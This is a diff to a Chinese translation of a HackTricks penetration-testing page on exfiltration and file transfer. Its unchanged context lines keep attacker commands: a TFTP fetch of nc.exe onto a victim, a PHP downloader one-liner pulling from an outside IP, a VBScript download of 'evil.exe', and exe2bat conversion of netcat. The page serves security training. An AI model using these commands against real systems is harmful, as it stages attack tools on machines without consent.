@@ -1,12 +1,12 @@
-# 数据外泄
+# Exfiltration
 
 {{#include ../banners/hacktricks-training.md}}
 
-## 常见的白名单域名以外泄信息
+## 常见的白名单域名以提取信息
 
 查看 [https://lots-project.com/](https://lots-project.com/) 以查找可以被滥用的常见白名单域名
 
-## 复制\&粘贴 Base64
+## Copy\&Paste Base64
 
 **Linux**
 ```bash
@@ -234,9 +234,9 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-在XP和2003中默认启用（在其他版本中需要在安装时显式添加）
+默认情况下在 XP 和 2003 中（在其他版本中需要在安装时显式添加）
 
-在Kali中，**启动TFTP服务器**：
+在 Kali 中，**启动 TFTP 服务器**：
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -248,13 +248,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-在 **victim** 中，连接到 Kali 服务器：
+在**受害者**上，连接到Kali服务器：
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-使用 PHP 一行代码下载文件：
+使用 PHP 单行代码下载文件：
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -296,7 +296,7 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供二进制文件的十六进制，`debug.exe`可以生成二进制文件。然而，重要的是要注意，debug.exe有**组装文件大小限制为64 kb**。
+`debug.exe`程序不仅允许检查二进制文件，还具有**从十六进制重建它们的能力**。这意味着通过提供二进制文件的十六进制，`debug.exe`可以生成二进制文件。然而，重要的是要注意，debug.exe**组装文件的大小限制为64 kb**。
 ```bash
 # Reduce the size
 upx -9 nc.exe
@@ -304,6 +304,10 @@ wine exe2bat.exe nc.exe nc.txt
 ```
 然后将文本复制粘贴到 Windows Shell 中，将创建一个名为 nc.exe 的文件。
 
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
+
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
